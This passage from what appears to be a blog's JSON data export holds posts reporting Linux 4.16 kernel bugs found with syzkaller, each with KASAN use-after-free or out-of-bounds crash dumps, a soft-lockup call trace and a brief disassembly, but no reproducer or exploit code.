==================================================================\n[  123.541879] BUG: KASAN: slab-out-of-bounds in process_preds+0x14c2/0x15f0\n[  123.543111] Write of size 4 at addr ffff8800672544c0 by task poc/2770\n[  123.544485] \n[  123.544813] CPU: 1 PID: 2770 Comm: poc Not tainted 4.16.0+ #30\n...\n[  123.643127] BUG: unable to handle kernel paging request at ffff87f93e164984\n[  123.644861] PGD 0 P4D 0 \n[  123.645532] Oops: 0000 [#1] SMP KASAN PTI\n[  123.646535] Modules linked in:\n[  123.647309] CPU: 1 PID: 2770 Comm: poc Tainted: G    B             4.16.0+ #30\n[  123.649070] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n...\n```\n\nAnd another...\n\n```c\n[  111.493097] BUG: KASAN: use-after-free in process_preds+0x14c2/0x15f0\n[  111.493773] Write of size 4 at addr ffff88001feabff8 by task syz-executor5/25857\n[  111.494553] \n[  111.494735] CPU: 0 PID: 25857 Comm: syz-executor5 Not tainted 4.16.0+ #30\n[  111.495449] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  111.496378] Call Trace:\n[  111.496651]  dump_stack+0x11b/0x1fd\n[  111.497029]  ? dump_stack_print_info.cold.0+0x81/0x81\n[  111.497547]  ? kmsg_dump_rewind_nolock+0xd9/0xd9\n[  111.498026]  print_address_description+0x60/0x255\n[  111.498468]  kasan_report+0x196/0x2a0\n[  111.498842]  ? process_preds+0x14c2/0x15f0\n[  111.499259]  ? process_preds+0x14c2/0x15f0\n[  111.499618]  ? parse_pred+0x21e0/0x21e0\n[  111.499969]  ? kmem_cache_alloc_trace+0x128/0x2c0\n[  111.500376]  ? create_filter+0x138/0x200\n[  111.500711]  ? wait_for_completion+0x6b0/0x6b0\n[  111.501112]  ? process_preds+0x15f0/0x15f0\n[  111.501466]  ? __lock_is_held+0xad/0x140\n[  111.501805]  ? ftrace_profile_set_filter+0x11c/0x280\n[  111.502227]  ? ftrace_profile_free_filter+0x60/0x60\n[  111.502649]  ? _copy_from_user+0x94/0x100\n[  111.503006]  ? memdup_user+0x5a/0x90\n[  111.503328]  ? _perf_ioctl+0xf0a/0x1520\n[  111.503736]  ? SyS_perf_event_open+0x40/0x40\n[  111.504194]  ? perf_event_ctx_lock_nested+0x1d5/0x410\n[  111.504730]  ? lock_acquire+0x4a0/0x4a0\n[  111.505152]  ? lock_downgrade+0x6e0/0x6e0\n[  111.505581]  ? rcu_is_watching+0x81/0x130\n[  111.506024]  ? perf_event_ctx_lock_nested+0x20f/0x410\n[  111.506565]  ? perf_event_ctx_lock_nested+0x339/0x410\n[  111.507099]  ? perf_swevent_init+0x530/0x530\n[  111.507558]  ? SyS_dup2+0x430/0x430\n[  111.507936]  ? perf_ioctl+0x54/0x80\n[  111.508310]  ? _perf_ioctl+0x1520/0x1520\n[  111.508726]  ? do_vfs_ioctl+0x199/0x13f0\n[  111.509163]  ? perf_event_set_output+0x580/0x580\n[  111.509571]  ? ioctl_preallocate+0x2a0/0x2a0\n[  111.509936]  ? selinux_capable+0x40/0x40\n[  111.510348]  ? __fget_light+0x299/0x3b0\n[  111.510672]  ? fget_raw+0x20/0x20\n[  111.510959]  ? SyS_futex+0x261/0x31e\n[  111.511275]  ? SyS_futex+0x26a/0x31e\n[  111.511591]  ? security_file_ioctl+0x52/0xa0\n[  111.512061]  ? ksys_ioctl+0x77/0xa0\n[  111.512437]  ? SyS_ioctl+0x1e/0x30\n[  111.512802]  ? ksys_ioctl+0xa0/0xa0\n[  111.513174]  ? do_syscall_64+0x23e/0x7a0\n[  111.513580]  ? _raw_spin_unlock_irq+0x24/0x40\n[  111.514027]  ? finish_task_switch+0x1c7/0x750\n[  111.514475]  ? syscall_return_slowpath+0x470/0x470\n[  111.514970]  ? syscall_return_slowpath+0x2df/0x470\n[  111.515459]  ? prepare_exit_to_usermode+0x330/0x330\n[  111.515960]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  111.516487]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  111.516982]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  111.517498] \n[  111.517634] The buggy address belongs to the page:\n[  111.518032] page:ffffea00007faac0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  111.518693] flags: 0x100000000000000()\n[  111.519014] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  111.519864] raw: ffffea000070d020 ffffea00007faaa0 ffff88002687ab30 0000000000000000\n[  111.520512] page dumped because: kasan: bad access detected\n[  111.520985] \n[  111.521129] Memory state around the buggy address:\n[  111.521532]  ffff88001feabe80: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n[  111.522145]  ffff88001feabf00: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n[  111.522716] >ffff88001feabf80: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n[  111.523257]                                                                 ^\n[  111.523914]  ffff88001feac000: fc 00 00 00 00 00 00 fc fc fc fc fc fc fc fc fc\n[  111.524663]  ffff88001feac080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[  111.525416] ==================================================================\n[  111.526048] Disabling lock debugging due to kernel taint\n[  111.526523] Kernel panic - not syncing: panic_on_warn set ...\n[  111.526523] \n[  111.527088] CPU: 0 PID: 25857 Comm: syz-executor5 Tainted: G    B             4.16.0+ #30\n[  111.527698] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  111.528362] Call Trace:\n[  111.528559]  dump_stack+0x11b/0x1fd\n[  111.528878]  ? dump_stack_print_info.cold.0+0x81/0x81\n[  111.529394]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[  111.529865]  panic+0x1c7/0x3b8\n[  111.530183]  ? add_taint.cold.3+0x16/0x16\n[  111.530595]  ? do_raw_spin_unlock+0xac/0x310\n[  111.531030]  ? do_raw_spin_unlock+0xac/0x310\n[  111.531489]  kasan_end_report+0x43/0x49\n[  111.531901]  kasan_report.cold.6+0xb7/0xe3\n[  111.532338]  process_preds+0x14c2/0x15f0\n[  111.532761]  ? process_preds+0x14c2/0x15f0\n[  111.533140]  ? parse_pred+0x21e0/0x21e0\n[  111.533550]  ? kmem_cache_alloc_trace+0x128/0x2c0\n[  111.534049]  ? create_filter+0x138/0x200\n[  111.534469]  ? wait_for_completion+0x6b0/0x6b0\n[  111.534940]  ? process_preds+0x15f0/0x15f0\n[  111.535377]  ? __lock_is_held+0xad/0x140\n[  111.535798]  ? ftrace_profile_set_filter+0x11c/0x280\n[  111.536357]  ? ftrace_profile_free_filter+0x60/0x60\n[  111.536873]  ? _copy_from_user+0x94/0x100\n[  111.537221]  ? memdup_user+0x5a/0x90\n[  111.537500]  ? _perf_ioctl+0xf0a/0x1520\n[  111.537796]  ? SyS_perf_event_open+0x40/0x40\n[  111.538124]  ? perf_event_ctx_lock_nested+0x1d5/0x410\n[  111.538527]  ? lock_acquire+0x4a0/0x4a0\n[  111.538824]  ? lock_downgrade+0x6e0/0x6e0\n[  111.539165]  ? rcu_is_watching+0x81/0x130\n[  111.539490]  ? perf_event_ctx_lock_nested+0x20f/0x410\n[  111.539873]  ? perf_event_ctx_lock_nested+0x339/0x410\n[  111.540257]  ? perf_swevent_init+0x530/0x530\n[  111.540585]  ? SyS_dup2+0x430/0x430\n[  111.540856]  ? perf_ioctl+0x54/0x80\n[  111.541179]  ? _perf_ioctl+0x1520/0x1520\n[  111.541479]  ? do_vfs_ioctl+0x199/0x13f0\n[  111.541783]  ? perf_event_set_output+0x580/0x580\n[  111.542138]  ? ioctl_preallocate+0x2a0/0x2a0\n[  111.542465]  ? selinux_capable+0x40/0x40\n[  111.542765]  ? __fget_light+0x299/0x3b0\n[  111.543083]  ? fget_raw+0x20/0x20\n[  111.543422]  ? SyS_futex+0x261/0x31e\n[  111.543780]  ? SyS_futex+0x26a/0x31e\n[  111.544142]  ? security_file_ioctl+0x52/0xa0\n[  111.544531]  ? ksys_ioctl+0x77/0xa0\n[  111.544801]  ? SyS_ioctl+0x1e/0x30\n[  111.545119]  ? ksys_ioctl+0xa0/0xa0\n[  111.545479]  ? do_syscall_64+0x23e/0x7a0\n[  111.545780]  ? _raw_spin_unlock_irq+0x24/0x40\n[  111.546115]  ? finish_task_switch+0x1c7/0x750\n[  111.546451]  ? syscall_return_slowpath+0x470/0x470\n[  111.546816]  ? syscall_return_slowpath+0x2df/0x470\n[  111.547183]  ? prepare_exit_to_usermode+0x330/0x330\n[  111.547562]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  111.547960]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  111.548320]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  111.548872] Dumping ftrace buffer:\n[  111.549185]    (ftrace buffer empty)\n[  111.549496] Kernel Offset: 0xe00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[  111.550359] Rebooting in 86400 seconds..\n```\n\n**End**\n\n","excerpt":"skb_release_data - use after free Write Got from syzkaller & Found in LK v4.16.0. [2018-04-10] Maybe, it is reproducible under some conditi…","fields":{"slug":"/2018-04-2-Founds/"},"frontmatter":{"date":"Apr 02, 2018","title":"Linux Kernel - 2018-04-2 Founds","tags":["Security","Linux-Kernel"],"update":"Apr 07, 2018"},"timeToRead":19}},{"node":{"rawMarkdownBody":"\n## dev_hard_start_xmit - soft lockup\n\nFound in LK v4.16.0-rc7. ```CPU#0``` stuck for 30s.\n\n### Call Trace (Dump)\n\n```c\n[  268.822032] Modules linked in:\n[  268.822287] irq event stamp: 10299\n[  268.822555] hardirqs last  enabled at (10298): [<0000000006ab7d5b>] restore_regs_and_return_to_kernel+0x0/0x30\n[  268.823301] hardirqs last disabled at (10299): [<000000005cde897b>] interrupt_entry+0xc0/0xe0\n[  268.823941] softirqs last  enabled at (10260): [<00000000f0685d4e>] __do_softirq+0x6f6/0xa8b\n[  268.824575] softirqs last disabled at (10263): [<00000000de954a09>] irq_exit+0x19b/0x1c0\n\n[  268.832693] Call Trace:\n[  268.832888]  <IRQ>\n[  268.833069]  ? e1000_clean+0x1be0/0x1be0\n[  268.833373]  ? packet_rcv_spkt+0x121/0x570\n[  268.833689]  ? packet_mmap+0x5b0/0x5b0\n[  268.833981]  ? rcutorture_record_progress+0x10/0x10\n[  268.834364]  ? save_trace+0x300/0x300\n[  268.834648]  ? dev_queue_xmit_nit+0x898/0xbe0\n[  268.834988]  ? napi_busy_loop+0xb20/0xb20\n[  268.835300]  ? __lock_is_held+0xad/0x140\n[  268.835630]  dev_hard_start_xmit+0x224/0xa30\n[  268.835974]  ? validate_xmit_skb_list+0x110/0x110\n[  268.836335]  ? netif_skb_features+0x578/0x8a0\n[  268.836674]  ? __skb_gso_segment+0x780/0x780\n[  268.837006]  ? lock_acquire+0x1a5/0x4a0\n[  268.837303]  ? sch_direct_xmit+0x27c/0x990\n[  268.837620]  ? validate_xmit_skb.isra.113+0x3ce/0xae0\n[  268.838014]  ? lock_downgrade+0x6e0/0x6e0\n[  268.838332]  ? netif_skb_features+0x8a0/0x8a0\n[  268.838668]  ? __local_bh_enable_ip+0xea/0x1b0\n[  268.839016]  sch_direct_xmit+0x303/0x990\n[  268.839323]  ? dev_watchdog+0x960/0x960\n[  268.839623]  ? __lock_is_held+0xad/0x140\n[  268.839931]  ? __qdisc_run+0x70a/0x16b0\n[  268.840232]  ? sch_direct_xmit+0x990/0x990\n[  268.840547]  ? lock_acquire+0x1a5/0x4a0\n[  268.840847]  ? _raw_spin_unlock+0x1f/0x30\n[  268.841155]  ? pfifo_fast_enqueue+0x372/0x590\n[  268.841490]  ? mini_qdisc_pair_init+0x150/0x150\n[  268.841867]  ? rcu_pm_notify+0xc0/0xc0\n[  268.842171]  ? __dev_queue_xmit+0x196c/0x2660\n[  268.842512]  ? netdev_pick_tx+0x260/0x260\n[  268.842824]  ? ___slab_alloc+0x567/0x600\n[  268.843128]  ? __alloc_skb+0x119/0x6c0\n[  268.843420]  ? __lock_is_held+0xad/0x140\n[  268.843729]  ? rcu_read_lock_sched_held+0xe4/0x120\n[  268.844094]  ? __kmalloc_node_track_caller+0x318/0x3b0\n[  268.844483]  ? __alloc_skb+0x119/0x6c0\n[  268.844775]  ? memset+0x1f/0x40\n[  268.845021]  ? __alloc_skb+0x50e/0x6c0\n[  268.845311]  ? netdev_alloc_frag+0x80/0x80\n[  268.845626]  ? print_usage_bug+0x140/0x140\n[  268.845941]  ? save_trace+0x300/0x300\n[  268.846274]  ? save_trace+0x300/0x300\n[  268.846568]  ? memcpy+0x34/0x50\n[  268.846816]  ? memset+0x1f/0x40\n[  268.847064]  ? arp_create+0x623/0x860\n[  268.847348]  ? ether_setup+0x2d0/0x2d0\n[  268.847642]  ? arp_send_dst.part.17+0x1ad/0x220\n[  268.847990]  ? arp_xmit+0x130/0x130\n[  268.848264]  ? mark_held_locks+0xa8/0xf0\n[  268.848569]  ? arp_solicit+0xbd9/0x1260\n[  268.848871]  ? arp_rcv+0x620/0x620\n[  268.849135]  ? neigh_probe+0x65/0xf0\n[  268.849419]  ? memzero_explicit+0xa/0x10\n[  268.849723]  ? lock_downgrade+0x6e0/0x6e0\n[  268.850041]  ? crng_backtrack_protect+0x80/0x80\n[  268.850397]  ? do_raw_write_trylock+0x190/0x190\n[  268.850743]  ? refcount_inc_not_zero+0xf5/0x180\n[  268.851090]  ? refcount_add+0x50/0x50\n[  268.851377]  ? arp_rcv+0x620/0x620\n[  268.851655]  ? neigh_probe+0xbb/0xf0\n[  268.851933]  ? neigh_timer_handler+0x6ae/0xc70\n[  268.852276]  ? __neigh_for_each_release+0x450/0x450\n[  268.852650]  ? __lock_is_held+0xad/0x140\n[  268.852958]  ? call_timer_fn+0x23a/0x7f0\n[  268.853261]  ? __neigh_for_each_release+0x450/0x450\n[  268.853633]  ? process_timeout+0x40/0x40\n[  268.853935]  ? find_held_lock+0x32/0x1b0\n[  268.854249]  ? __run_timers+0x688/0xa30\n[  268.854547]  ? lock_acquire+0x4a0/0x4a0\n[  268.854842]  ? find_held_lock+0x32/0x1b0\n[  268.855145]  ? lock_downgrade+0x6e0/0x6e0\n[  268.855455]  ? do_raw_spin_trylock+0x190/0x190\n[  268.855802]  ? _raw_spin_unlock_irq+0x24/0x40\n[  268.856134]  ? __neigh_for_each_release+0x450/0x450\n[  268.856507]  ? __neigh_for_each_release+0x450/0x450\n[  268.856878]  ? __run_timers+0x693/0xa30\n[  268.857179]  ? msleep_interruptible+0x140/0x140\n[  268.857529]  ? timerqueue_add+0x1c8/0x270\n[  268.857839]  ? save_trace+0x300/0x300\n[  268.858129]  ? enqueue_hrtimer+0x168/0x480\n[  268.858443]  ? retrigger_next_event+0x1d0/0x1d0\n[  268.858796]  ? find_held_lock+0x32/0x1b0\n[  268.859113]  ? clockevents_program_event+0x124/0x2d0\n[  268.859491]  ? lock_acquire+0x1a5/0x4a0\n[  268.859794]  ? hrtimer_init+0x3b0/0x3b0\n[  268.860103]  ? rcu_pm_notify+0xc0/0xc0\n[  268.860399]  ? run_timer_softirq+0x48/0x70\n[  268.860716]  ? __do_softirq+0x2a3/0xa8b\n[  268.861018]  ? __irqentry_text_end+0x1f9917/0x1f9917\n[  268.861398]  ? do_raw_spin_trylock+0x190/0x190\n[  268.861758]  ? lapic_next_event+0x50/0x80\n[  268.862067]  ? clockevents_program_event+0xff/0x2d0\n[  268.862466]  ? tick_program_event+0x7e/0x100\n[  268.862915]  ? hrtimer_interrupt+0x535/0x6e0\n[  268.863347]  ? irq_exit+0x19b/0x1c0\n[  268.863679]  ? smp_apic_timer_interrupt+0x162/0x6d0\n[  268.864189]  ? smp_call_function_single_interrupt+0x650/0x650\n[  268.864781]  ? smp_thermal_interrupt+0x710/0x710\n[  268.865270]  ? ioapic_ir_ack_level+0xc0/0xc0\n[  268.865714]  ? _raw_spin_unlock+0x1f/0x30\n[  268.866080]  ? handle_fasteoi_irq+0x1d8/0x500\n[  268.866515]  ? task_prio+0x50/0x50\n[  268.866882]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  268.867331]  ? apic_timer_interrupt+0xf/0x20\n[  268.867745]  </IRQ>\n```\n\n### Code\n\n> Code : <br> \n> c8 00 00 00 48 c1 ea 03 48 01 c3 48 b8 00 00 00 00 00 fc ff df 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 5f 2b 00 00 41 8b 47 18 89 03 <31> db e9 a7 0c 00 00 e8 6d 7e aa fe 83 fb 03 0f 86 f0 1c 00 00\n\n```c\n   0:   c8 00 00 00             enter  0x0,0x0\n   4:   48 c1 ea 03             shr    rdx,0x3\n   8:   48 01 c3                add    rbx,rax\n   b:   48 b8 00 00 00 00 00    movabs rax,0xdffffc0000000000\n  12:   fc ff df \n  15:   0f b6 04 02             movzx  eax,BYTE PTR [rdx+rax*1]\n  19:   84 c0                   test   al,al\n  1b:   74 08                   je     0x25\n  1d:   3c 03                   cmp    al,0x3\n  1f:   0f 8e 5f 2b 00 00       jle    0x2b84\n  25:   41 8b 47 18             mov    eax,DWORD PTR [r15+0x18]\n  29:   89 03                   mov    DWORD PTR [rbx],eax\n  2b:  *31 db                   xor    ebx,ebx\n  2d:   e9 a7 0c 00 00          jmp    0xcd9\n  32:   e8 6d 7e aa fe          call   0xfffffffffeaa7ea4\n  37:   83 fb 03                cmp    ebx,0x3\n  3a:   0f 86 f0 1c 00 00       jbe    0x1d30\n```\n\n**End**\n\n\n\n\n## iptunnel_handle_offloads - use after free Read\n\nGot from syzkaller & Found in LK v4.16.0-rc7. Nor verified yet.\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: use-after-free in skb_is_gso include/linux/skbuff.h:4031 [inline]\nBUG: KASAN: use-after-free in iptunnel_handle_offloads+0x4ee/0x620 net/ipv4/ip_tunnel_core.c:170\nRead of size 2 at addr ffff88007f97986c by task syz-executor2/11467\n\nCPU: 1 PID: 11467 Comm: syz-executor2 Not tainted 4.16.0-rc7+ #27\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n print_address_description+0x60/0x224 mm/kasan/report.c:256\n kasan_report_error mm/kasan/report.c:354 [inline]\n kasan_report+0x196/0x2a0 mm/kasan/report.c:412\n\nAllocated by task 11467:\n set_track mm/kasan/kasan.c:459 [inline]\n kasan_kmalloc+0xbf/0xe0 mm/kasan/kasan.c:552\n slab_post_alloc_hook mm/slab.h:443 [inline]\n slab_alloc_node mm/slub.c:2725 [inline]\n __kmalloc_node_track_caller+0x11c/0x3b0 mm/slub.c:4338\n __kmalloc_reserve.isra.41+0x37/0xc0 net/core/skbuff.c:137\n __alloc_skb+0x119/0x6c0 net/core/skbuff.c:205\n alloc_skb include/linux/skbuff.h:983 [inline]\n alloc_skb_with_frags+0x102/0x640 net/core/skbuff.c:5227\n sock_alloc_send_pskb+0x71a/0x920 net/core/sock.c:2085\n packet_alloc_skb net/packet/af_packet.c:2803 [inline]\n packet_snd net/packet/af_packet.c:2894 [inline]\n packet_sendmsg+0x228e/0x59a0 net/packet/af_packet.c:2969\n sock_sendmsg_nosec net/socket.c:630 [inline]\n sock_sendmsg+0xc0/0x100 net/socket.c:640\n SYSC_sendto+0x33c/0x560 net/socket.c:1747\n do_syscall_64+0x23e/0x7a0 arch/x86/entry/common.c:287\n\nFreed by task 11467:\n set_track mm/kasan/kasan.c:459 [inline]\n __kasan_slab_free+0x12c/0x170 mm/kasan/kasan.c:520\n slab_free_hook mm/slub.c:1393 [inline]\n slab_free_freelist_hook mm/slub.c:1414 [inline]\n slab_free mm/slub.c:2968 [inline]\n kfree+0xf3/0x310 mm/slub.c:3917\n skb_free_head+0x83/0xa0 net/core/skbuff.c:550\n skb_release_data+0x553/0x720 net/core/skbuff.c:570\n skb_release_all+0x46/0x60 net/core/skbuff.c:627\n __kfree_skb net/core/skbuff.c:641 [inline]\n kfree_skb+0x150/0x490 net/core/skbuff.c:659\n packet_rcv_fanout+0x219/0x7b0 net/packet/af_packet.c:1442\n dev_queue_xmit_nit+0x84f/0xbe0 net/core/dev.c:1991\n xmit_one net/core/dev.c:3022 [inline]\n dev_hard_start_xmit+0x15a/0xa30 net/core/dev.c:3042\n __dev_queue_xmit+0xe1d/0x2660 net/core/dev.c:3557\n\nThe buggy address belongs to the object at ffff88007f9797a8\n which belongs to the cache kmalloc-512 of size 512\nThe buggy address is located 196 bytes inside of\n 512-byte region [ffff88007f9797a8, ffff88007f9799a8)\nThe buggy address belongs to the page:\npage:ffffea0001fe5e00 count:1 mapcount:0 mapping:0000000000000000 index:0xffff88007f978a28 compound_mapcount: 0\nflags: 0x500000000008100(slab|head)\nraw: 0500000000008100 0000000000000000 ffff88007f978a28 0000000100120009\nraw: ffffea0001e83a20 ffff88007f8014c0 ffff88002dc0ce00 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff88007f979700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff88007f979780: fc fc fc fc fc fb fb fb fb fb fb fb fb fb fb fb\n>ffff88007f979800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n                                                          ^\n ffff88007f979880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff88007f979900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n==================================================================\n\n```\n\n**End**\n\n\n## copyout - use after free Read\n\nGot from syzkaller & Found in LK v4.16.0-rc7.\n\n### Call Trace (Dump)\n\n```c\n[   46.055481] BUG: KASAN: use-after-free in copyout+0x78/0xb0\n[   46.056136] Read of size 10 at addr ffff88007acdefc8 by task syz-executor5/6348\n[   46.056979] \n[   46.057163] CPU: 1 PID: 6348 Comm: syz-executor5 Not tainted 4.16.0-rc7+ #27\n[   46.057999] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[   46.059080] Call Trace:\n[   46.059411]  dump_stack+0x10a/0x1dd\n[   46.059853]  ? _atomic_dec_and_lock+0x163/0x163\n[   46.060422]  ? show_regs_print_info+0x12/0x12\n[   46.060969]  print_address_description+0x60/0x224\n[   46.061562]  kasan_report+0x196/0x2a0\n[   46.062021]  ? copyout+0x78/0xb0\n[   46.062452]  ? copyout+0x78/0xb0\n[   46.062874]  ? _copy_to_iter+0x242/0x1220\n[   46.063399]  ? futex_wake+0x528/0x630\n[   46.063867]  ? check_stack_object+0x76/0x90\n[   46.064402]  ? iov_iter_zero+0x1150/0x1150\n[   46.064904]  ? __check_object_size+0x89/0x540\n[   46.065452]  ? usercopy_warn+0xf0/0xf0\n[   46.065912]  ? __skb_recv_datagram+0x1bf/0x270\n[   46.066481]  ? rcu_pm_notify+0xc0/0xc0\n[   46.066979]  ? skb_copy_datagram_iter+0x193/0x9c0\n[   46.067591]  ? skb_recv_datagram+0xca/0x120\n[   46.067951]  ? skb_kill_datagram+0x100/0x100\n[   46.068356]  ? __might_fault+0x177/0x1b0\n[   46.068715]  ? _copy_from_user+0x94/0x100\n[   46.069059]  ? rw_copy_check_uvector+0x227/0x2f0\n[   46.069522]  ? packet_recvmsg+0x252/0x14e0\n[   46.069880]  ? packet_rcv_spkt+0x570/0x570\n[   46.070243]  ? __might_fault+0x177/0x1b0\n[   46.070679]  ? copy_msghdr_from_user+0x354/0x4f0\n[   46.071181]  ? security_socket_recvmsg+0x8b/0xc0\n[   46.071708]  ? packet_rcv_spkt+0x570/0x570\n[   46.072153]  ? sock_recvmsg+0xc2/0x110\n[   46.072573]  ? __sock_recv_wifi_status+0x1e0/0x1e0\n[   46.073039]  ? ___sys_recvmsg+0x26c/0x5e0\n[   46.073384]  ? SYSC_recvfrom+0x560/0x560\n[   46.073751]  ? fput+0xa/0x130\n[   46.074006]  ? SYSC_sendto+0x3ff/0x560\n[   46.074331]  ? SYSC_connect+0x420/0x420\n[   46.074691]  ? fget_raw+0x20/0x20\n[   46.075055]  ? selinux_netlbl_socket_setsockopt+0xf1/0x430\n[   46.075624]  ? __sys_recvmsg+0xc9/0x200\n[   46.075955]  ? SyS_sendmmsg+0x50/0x50\n[   46.076280]  ? SyS_futex+0x261/0x31e\n[   46.076600]  ? SyS_futex+0x26a/0x31e\n[   46.076927]  ? security_file_ioctl+0x76/0xb0\n[   46.077299]  ? SyS_recvmsg+0x27/0x40\n[   46.077618]  ? __sys_recvmsg+0x200/0x200\n[   46.077957]  ? do_syscall_64+0x23e/0x7a0\n[   46.078296]  ? _raw_spin_unlock_irq+0x24/0x40\n[   46.078679]  ? finish_task_switch+0x1c2/0x740\n[   46.079054]  ? syscall_return_slowpath+0x470/0x470\n[   46.079469]  ? syscall_return_slowpath+0x2df/0x470\n[   46.080003]  ? prepare_exit_to_usermode+0x330/0x330\n[   46.080482]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[   46.081024]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   46.081488]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[   46.081947] \n[   46.082180] Allocated by task 6378:\n[   46.082484]  kasan_kmalloc+0xbf/0xe0\n[   46.082803]  __kmalloc_node_track_caller+0x11c/0x3b0\n[   46.083287]  __kmalloc_reserve.isra.41+0x37/0xc0\n[   46.083717]  __alloc_skb+0x119/0x6c0\n[   46.084018]  alloc_skb_with_frags+0x102/0x640\n[   46.084388]  sock_alloc_send_pskb+0x71a/0x920\n[   46.084761]  packet_sendmsg+0x228e/0x59a0\n[   46.085170]  sock_sendmsg+0xc0/0x100\n[   46.085563]  SYSC_sendto+0x33c/0x560\n[   46.085898]  do_syscall_64+0x23e/0x7a0\n[   46.086216] \n[   46.086353] Freed by task 6378:\n[   46.086702]  __kasan_slab_free+0x12c/0x170\n[   46.087092]  kfree+0xf3/0x310\n[   46.087352]  skb_free_head+0x83/0xa0\n[   46.087685]  skb_release_data+0x553/0x720\n[   46.087994]  skb_release_all+0x46/0x60\n[   46.088284]  kfree_skb+0x150/0x490\n[   46.088548]  sit_tunnel_xmit+0x15d/0x2e30\n[   46.088984]  dev_hard_start_xmit+0x224/0xa30\n[   46.089494]  __dev_queue_xmit+0xe1d/0x2660\n[   46.089973] \n[   46.090160] The buggy address belongs to the object at ffff88007acdef48\n[   46.090160]  which belongs to the cache kmalloc-512 of size 512\n[   46.091284] The buggy address is located 128 bytes inside of\n[   46.091284]  512-byte region [ffff88007acdef48, ffff88007acdf148)\n[   46.092320] The buggy address belongs to the page:\n[   46.092728] page:ffffea0001eb3700 count:1 mapcount:0 mapping:0000000000000000 index:0xffff88007acdd0e8 compound_mapcount: 0\n[   46.093651] flags: 0x500000000008100(slab|head)\n[   46.094049] raw: 0500000000008100 0000000000000000 ffff88007acdd0e8 0000000100120009\n[   46.094689] raw: ffffea0001eb2120 ffff88007f8014c0 ffff88002dc0ce00 0000000000000000\n[   46.095387] page dumped because: kasan: bad access detected\n[   46.095914] \n[   46.096058] Memory state around the buggy address:\n[   46.096461]  ffff88007acdee80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   46.097068]  ffff88007acdef00: fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb\n[   46.097663] >ffff88007acdef80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   46.098274]                                               ^\n[   46.098746]  ffff88007acdf000: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   46.099374]  ffff88007acdf080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   46.100056] ==================================================================\n\n[   46.103377] Call Trace:\n[   46.103632]  dump_stack+0x10a/0x1dd\n[   46.103936]  ? _atomic_dec_and_lock+0x163/0x163\n[   46.104325]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   46.104717]  panic+0x1b3/0x3a4\n[   46.104991]  ? add_taint.cold.3+0x16/0x16\n[   46.105351]  ? add_taint+0x15/0x40\n[   46.105644]  ? add_taint+0x15/0x40\n[   46.105938]  kasan_end_report+0x43/0x49\n[   46.106358]  kasan_report.cold.5+0xb7/0xe3\n[   46.106779]  copyout+0x78/0xb0\n[   46.107104]  ? copyout+0x78/0xb0\n[   46.107434]  ? _copy_to_iter+0x242/0x1220\n...\n[   46.107911]  ? futex_wake+0x528/0x630\n[   46.108557]  ? check_stack_object+0x76/0x90\n...\n[   46.108945]  ? iov_iter_zero+0x1150/0x1150\n[   46.109645]  ? __check_object_size+0x89/0x540\n[   46.110092]  ? usercopy_warn+0xf0/0xf0\n[   46.110549]  ? __skb_recv_datagram+0x1bf/0x270\n[   46.111112]  ? rcu_pm_notify+0xc0/0xc0\n[   46.111584]  ? skb_copy_datagram_iter+0x193/0x9c0\n[   46.112141]  ? skb_recv_datagram+0xca/0x120\n[   46.112535]  ? skb_kill_datagram+0x100/0x100\n[   46.112985]  ? __might_fault+0x177/0x1b0\n[   46.113499]  ? _copy_from_user+0x94/0x100\n[   46.113994]  ? rw_copy_check_uvector+0x227/0x2f0\n[   46.114456]  ? packet_recvmsg+0x252/0x14e0\n[   46.114850]  ? packet_rcv_spkt+0x570/0x570\n[   46.115314]  ? __might_fault+0x177/0x1b0\n[   46.115836]  ? copy_msghdr_from_user+0x354/0x4f0\n[   46.116432]  ? security_socket_recvmsg+0x8b/0xc0\n[   46.116992]  ? packet_rcv_spkt+0x570/0x570\n[   46.117491]  ? sock_recvmsg+0xc2/0x110\n[   46.117927]  ? __sock_recv_wifi_status+0x1e0/0x1e0\n[   46.118468]  ? 